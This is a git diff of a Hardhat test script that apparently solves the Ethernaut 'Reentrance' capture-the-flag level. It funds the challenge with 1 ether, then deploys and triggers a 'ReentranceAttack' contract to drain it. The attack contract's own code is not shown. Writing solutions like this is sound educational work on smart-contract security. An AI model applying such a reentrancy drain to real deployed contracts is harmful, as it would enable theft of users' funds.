@@ -55,7 +55,7 @@ before(async () => {
   [eoa] = await ethers.getSigners();
   challengeAddress = await createChallenge(
     contractLevel,
-    0,
+    ethers.utils.parseUnits("1", "ether"),
     "ReentranceFactory"
   );
   //   const artifact = await artifacts.readArtifact("Fal1out");
@@ -63,7 +63,23 @@ before(async () => {
   console.log(`eoa address: ${JSON.stringify(eoa.address)}`);
 });
 
-it("solves the challenge", async () => {});
+it("solves the challenge", async () => {
+  let attackFactory = await ethers.getContractFactory("ReentranceAttack");
+  let attackContract = await attackFactory.deploy(challenge.address);
+  await attackContract.deployed();
+  let b = await ethers.provider.getBalance(challenge.address);
+  let contractBalance = await b.toString();
+  console.log(
+    `balance of contract before (in script): ${JSON.stringify(
+      await contractBalance
+    )}`
+  );
+  let amount = ethers.utils.parseUnits("0.01", "ether");
+  let tx = await attackContract.attack({
+    value: amount,
+  });
+  await tx.wait(1);
+});
 
 after(async () => {
   expect(await submitLevel(challenge.address), "level not solved").to.be.true;
